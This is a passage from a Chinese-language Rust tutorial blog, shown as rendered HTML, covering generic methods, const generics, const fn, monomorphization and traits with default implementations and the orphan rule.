class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用泛型参数前，依然需要提前声明：impl&lt;T&gt;,只有提前声明了，我们才能在Point&lt;T&gt;中使用它，这样Rust就知道Point的尖括号中的类型是泛型而不是具体类型。这里需要注意的是，这里的Point&lt;T&gt;不在是泛型声明，而是一个完整的结构体类型，因为我们定义的结构体是Point&lt;T&gt;,而不是Point</p><h5 id="为具体的泛型实现方法"><a href="#为具体的泛型实现方法" class="headerlink" title="为具体的泛型实现方法"></a>为具体的泛型实现方法</h5><p>对于 <code>Point&lt;T&gt;</code> 类型，你不仅能定义基于 <code>T</code> 的方法，还能针对特定的具体类型，进行方法定义：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Point</span>&lt;<span class="type">f32</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">distance_from_origin</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">f32</span> &#123;</span><br><span class="line">        (<span class="keyword">self</span>.x.<span class="title function_ invoke__">powi</span>(<span class="number">2</span>) + <span class="keyword">self</span>.y.<span class="title function_ invoke__">powi</span>(<span class="number">2</span>)).<span class="title function_ invoke__">sqrt</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码意味着 <code>Point&lt;f32&gt;</code> 类型会有一个方法 <code>distance_from_origin</code>，而其他 <code>T</code> 不是 <code>f32</code> 类型的 <code>Point&lt;T&gt; </code>实例则没有定义此方法。这个方法计算点实例与坐标<code>(0.0, 0.0)</code> 之间的距离，并使用了只能用于浮点型的数学运算符。</p><p>这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。</p><h5 id="const泛型-Rust1-51版本引入的主要特征"><a href="#const泛型-Rust1-51版本引入的主要特征" class="headerlink" title="const泛型(Rust1.51版本引入的主要特征)"></a>const泛型(Rust1.51版本引入的主要特征)</h5><p>以上总结起来就是：针对类型实现的泛型，所有的泛型都是为了抽象不同的类型，那有没有针对值的泛型？</p><p>我们来看下面，在数组中说过[i32;2]和[i32;3]是不同的数组类型，比如下面的代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">display_array</span>(arr: [<span class="type">i32</span>; <span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">3</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合代码和报错，可以很清楚的看出，<code>[i32; 3]</code> 和 <code>[i32; 2]</code> 确实是两个完全不同的类型，因此无法用同一个函数调用。</p><p>首先，让我们修改代码，让display_array能打印任意长度的i32数组:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">display_array</span>(arr: &amp;[<span class="type">i32</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">3</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(&amp;arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(&amp;arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，只要使用数组切片，然后传入arr的不可变引用即可</p><p>接着，将i32改成所有类型的数组:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">display_array</span>&lt;T: std::fmt::<span class="built_in">Debug</span>&gt;(arr: &amp;[T]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">3</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(&amp;arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(&amp;arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是需要对T加一个限制std::fmt::Debug,该限制表明T可以用在println!(“{:?}”,arr)中，因为{:?}形式的格式化输出需要arr实现该特征</p><p>通过引用，我们可以很轻松的解决处理任何类型数组的问题，但是如果在某些场景下引用不适宜用或者干脆不能用呢？你们知道为什么以前 Rust 的一些数组库，在使用的时候都限定长度不超过 32 吗？因为它们会为每个长度都单独实现一个函数，简直。。。毫无人性。难道没有什么办法可以解决这个问题吗？</p><p>好在，现在咱们有了 const 泛型，也就是针对值的泛型，正好可以用于处理数组长度的问题：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">display_array</span>&lt;T: std::fmt::<span class="built_in">Debug</span>, <span class="keyword">const</span> N: <span class="type">usize</span>&gt;(arr: [T; N]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">3</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">arr</span>: [<span class="type">i32</span>; <span class="number">2</span>] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line">    <span class="title function_ invoke__">display_array</span>(arr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上，我们对了一该类型为[T;N]的数组，其中T是一个基于类型的泛型参数，这个和之前讲的泛型没什么区别，而重点在于N，是一个基于值的泛型参数，因为它用来替代的是数组的长度。</p><p>N就是const泛型，定义的语法是const N：usize，表示const泛型N,它基于的值是usize</p><h5 id="const泛型表达式"><a href="#const泛型表达式" class="headerlink" title="const泛型表达式"></a>const泛型表达式</h5><p>假设我们某个代码需要再内存很小的平台上工作，因此需要限制函数参数占用的内存大小，此时就可以使用const泛型表达式来实现:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目前只能在nightly版本下使用</span></span><br><span class="line"><span class="meta">#![allow(incomplete_features)]</span></span><br><span class="line"><span class="meta">#![feature(generic_const_exprs)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">something</span>&lt;T&gt;(val: T)</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    Assert&lt;&#123; core::mem::size_of::&lt;T&gt;() &lt; <span class="number">768</span> &#125;&gt;: IsTrue,</span><br><span class="line">    <span class="comment">//       ^-----------------------------^ 这里是一个 const 表达式，换成其它的 const 表达式也可以</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="title function_ invoke__">something</span>([<span class="number">0u8</span>; <span class="number">0</span>]); <span class="comment">// ok</span></span><br><span class="line">    <span class="title function_ invoke__">something</span>([<span class="number">0u8</span>; <span class="number">512</span>]); <span class="comment">// ok</span></span><br><span class="line">    <span class="title function_ invoke__">something</span>([<span class="number">0u8</span>; <span class="number">1024</span>]); <span class="comment">// 编译错误，数组长度是1024字节，超过了768字节的参数长度限制</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Assert</span>&lt;<span class="keyword">const</span> CHECK: <span class="type">bool</span>&gt; &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">IsTrue</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">IsTrue</span> <span class="keyword">for</span> <span class="title class_">Assert</span>&lt;<span class="literal">true</span>&gt; &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="const-fn"><a href="#const-fn" class="headerlink" title="const  fn"></a>const  fn</h5><p>常量函数，const fn允许我们在编译期对函数进行求值，进而实现更高效、灵活的代码设计</p><p>作用：在某些场景下，我们希望在编译期就计算出一些值，以提高运行时的性能或满足某些编译期的约束条件。例如，定义数组的长度、计算常量值等。</p><p>const fn基本用法:</p><p>要定义一个常量函数，只需要在函数声明前加上const关键字</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">fn</span> <span class="title function_">add</span>(a: <span class="type">usize</span>, b: <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    a + b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> RESULT: <span class="type">usize</span> = <span class="title function_ invoke__">add</span>(<span class="number">5</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The result is: &#123;&#125;&quot;</span>, RESULT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="const-fn的限制"><a href="#const-fn的限制" class="headerlink" title="const fn的限制"></a>const fn的限制</h5><p>由于其在编译期执行，以确保函数能在编译期被安全地求值，因此有一些限制，例如，不可将随机数生成器写成 <code>const fn</code></p><p>无论在编译时还是运行时调用const fn，它们的结果总是相同的，即是多次调用也一样。唯一的例外是，如果你在极端情况下进行复杂的浮点操作，可能会得到（非常轻微的）不同结构。因此，不建议使 <code>数组长度 (arr.len())</code> 和 <code>Enum判别式</code> 依赖于浮点计算。</p><h5 id="结合const-fn与const泛型"><a href="#结合const-fn与const泛型" class="headerlink" title="结合const fn与const泛型"></a>结合const fn与const泛型</h5><p>将 <code>const fn</code> 与 <code>const 泛型</code> 结合，可以实现更加灵活和高效的代码设计。例如，创建一个固定大小的缓冲区结构，其中缓冲区大小由编译期计算确定：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Buffer</span>&lt;<span class="keyword">const</span> N: <span class="type">usize</span>&gt; &#123;</span><br><span class="line">    data: [<span class="type">u8</span>; N],</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">fn</span> <span class="title function_">compute_buffer_size</span>(factor: <span class="type">usize</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    factor * <span class="number">1024</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">const</span> SIZE: <span class="type">usize</span> = <span class="title function_ invoke__">compute_buffer_size</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = Buffer::&lt;SIZE&gt; &#123;</span><br><span class="line">        data: [<span class="number">0</span>; SIZE],</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Buffer size: &#123;&#125; bytes&quot;</span>, buffer.data.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>compute_buffer_size</code> 是一个常量函数，它根据传入的 <code>factor</code> 计算缓冲区的大小。在 <code>main</code> 函数中，我们使用 <code>compute_buffer_size(4)</code> 来计算缓冲区大小为 4096 字节，并将其作为泛型参数传递给 <code>Buffer</code> 结构体。这样，缓冲区的大小在编译期就被确定下来，避免了运行时的计算开销。</p><h5 id="泛型的性能"><a href="#泛型的性能" class="headerlink" title="泛型的性能"></a>泛型的性能</h5><p>Rust通过在编译时进行泛型代码的单态化来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用的代码转换为特定代码的国城</p><p>编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。</p><p>我们来看看一个使用标准库中Option枚举的例子:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#![allow(unused)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">integer</span> = <span class="title function_ invoke__">Some</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">float</span> = <span class="title function_ invoke__">Some</span>(<span class="number">5.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 Rust 编译这些代码的时候，它会进行单态化。编译器会读取传递给 <code>Option&lt;T&gt;</code> 的值并发现有两种 <code>Option&lt;T&gt;</code>：一种对应 <code>i32</code> 另一种对应 <code>f64</code>。为此，它会将泛型定义 <code>Option&lt;T&gt;</code> 展开为 <code>Option_i32</code> 和 <code>Option_f64</code>，接着将泛型定义替换为这两个具体的定义。</p><p>编译器生成的单态化版本的代码看起来像这样：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Option_i32</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(<span class="type">i32</span>),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Option_f64</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Some</span>(<span class="type">f64</span>),</span><br><span class="line">    <span class="literal">None</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">integer</span> = Option_i32::<span class="title function_ invoke__">Some</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">float</span> = Option_f64::<span class="title function_ invoke__">Some</span>(<span class="number">5.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以使用泛型来编写不重复的代码，而 Rust 将会为每一个实例编译其特定类型的代码。这意味着在使用泛型时没有运行时开销；当代码运行，它的执行效率就跟好像手写每个具体定义的重复代码一样。这个单态化过程正是 Rust 泛型在运行时极其高效的原因。</p><h4 id="特征Trait"><a href="#特征Trait" class="headerlink" title="特征Trait"></a>特征Trait</h4><p>跟接口类似</p><p>在之前的代码中，我们也多次见过特征的使用，例如 <code>#[derive(Debug)]</code>，它在我们定义的类型(<code>struct</code>)上自动派生 <code>Debug</code> 特征，接着可以使用 <code>println!(&quot;&#123;:?&#125;&quot;, x)</code> 打印这个类型；再例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;T: std::ops::Add&lt;Output = T&gt;&gt;(a:T, b:T) <span class="punctuation">-&gt;</span> T &#123;</span><br><span class="line">    a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>std::ops::Add</code> 特征来限制 <code>T</code>，只有 <code>T</code> 实现了 <code>std::ops::Add</code> 才能进行合法的加法操作，毕竟不是所有的类型都能进行相加。</p><p>这些都说明一个道理，特征定义了<strong>一组可以被共享的行为，只要实现了特征，你就能使用这组行为</strong>。</p><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><p>如果不同的类型具有相同的行为，那么我们就可以定义一个特征，然后为这些类型实现该特征。<strong>定义特征</strong>是把一些方法组合在一起，目的是定义一个实现某些目标所必需的行为的集合。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Summary</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里使用 <code>trait</code> 关键字来声明一个特征，<code>Summary</code> 是特征名。在大括号中定义了该特征的所有方法，在这个例子中是： <code>fn summarize(&amp;self) -&gt; String</code>。</p><p>特征只定义行为看起来怎么样，而不对行为具体是怎么样的。因此，我们只定义特征方法的前面，而不进行实现，此时方法签名结尾是<code>;</code>，而不是一个{}</p><h5 id="为类型实现特征"><a href="#为类型实现特征" class="headerlink" title="为类型实现特征"></a>为类型实现特征</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Summary</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Post</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>, <span class="comment">// 标题</span></span><br><span class="line">    <span class="keyword">pub</span> author: <span class="type">String</span>, <span class="comment">// 作者</span></span><br><span class="line">    <span class="keyword">pub</span> content: <span class="type">String</span>, <span class="comment">// 内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Summary</span> <span class="keyword">for</span> <span class="title class_">Post</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;文章&#123;&#125;, 作者是&#123;&#125;&quot;</span>, <span class="keyword">self</span>.title, <span class="keyword">self</span>.author)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Weibo</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> username: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> content: <span class="type">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Summary</span> <span class="keyword">for</span> <span class="title class_">Weibo</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;发表了微博&#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实现特征的语法与为结构体、枚举实现方法很像:impl Summary for Post，我们把它称做”为Post类型实现Summary特征”，然后在impl内实现该特征的具体方法</p><p>接下来就是调用特征方法:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">post</span> = Post&#123;title: <span class="string">&quot;Rust语言简介&quot;</span>.<span class="title function_ invoke__">to_string</span>(),author: <span class="string">&quot;Sunface&quot;</span>.<span class="title function_ invoke__">to_string</span>(), content: <span class="string">&quot;Rust棒极了!&quot;</span>.<span class="title function_ invoke__">to_string</span>()&#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">weibo</span> = Weibo&#123;username: <span class="string">&quot;sunface&quot;</span>.<span class="title function_ invoke__">to_string</span>(),content: <span class="string">&quot;好像微博没Tweet好用&quot;</span>.<span class="title function_ invoke__">to_string</span>()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,post.<span class="title function_ invoke__">summarize</span>());</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,weibo.<span class="title function_ invoke__">summarize</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="特性定义与实现的位置-孤儿法则"><a href="#特性定义与实现的位置-孤儿法则" class="headerlink" title="特性定义与实现的位置(孤儿法则)"></a><strong>特性定义与实现的位置(孤儿法则)</strong></h6><p>上面我们将<code>Summary</code>定义成了pub公开的，这样，如果他人想要使用我们的 <code>Summary</code> 特征，则可以引入到他们的包中，然后再进行实现。</p><p>关于特征实现与定义的位置，<strong>如果你想要为类型A实现特征T，那么A或者T至少有一个是在当前作用域中定义的</strong>，例如我们可以为上面的 <code>Post</code> 类型实现标准库中的 <code>Display</code> 特征，这是因为 <code>Post</code> 类型定义在当前的作用域中。同时，我们也可以在当前包中为 <code>String</code> 类型实现 <code>Summary</code> 特征，因为 <code>Summary</code> 定义在当前作用域中。</p><p>但是你无法在当前作用域中，为 <code>String</code> 类型实现 <code>Display</code> 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。</p><p>该规则被称为<strong>孤儿规则</strong>，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码</p><h6 id="默认实现"><a href="#默认实现" class="headerlink" title="默认实现"></a>默认实现</h6><p>我们可以在特征中定义具有默认实现的方法，这样其它类型无需再实现该方法，或者也可以选择重载该方法:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Summary</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;(Read more...)&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面为Summary定义了一个默认实现，下面我们编写段代码来测试：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Summary</span> <span class="keyword">for</span> <span class="title class_">Post</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Summary</span> <span class="keyword">for</span> <span class="title class_">Weibo</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">summarize</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;发表了微博&#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们发现post使用了默认实现，而Weibo重载了该方法</p><p>默认实现允许调用相同特征中的其他方法，哪怕这些方法没有默认实现。如此，特征可以提供很多有用的功能而只需要实现指定的一小部分内容。</p><h5 id="使用特征作为函数参数"><a href="#使用特征作为函数参数" class="headerlink" title="使用特征作为函数参数"></a><strong>使用特征作为函数参数</strong></h5><p>之前提到，特征仅仅是用来实现方法，有些浪费</p><p>现在来定义一个函数，使用特征作为函数参数：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">notify</span>(item: &amp;<span class="keyword">impl</span> <span class="title class_">Summary</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Breaking news! &#123;&#125;&quot;</span>, item.<span class="title function_ invoke__">summarize</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>impl 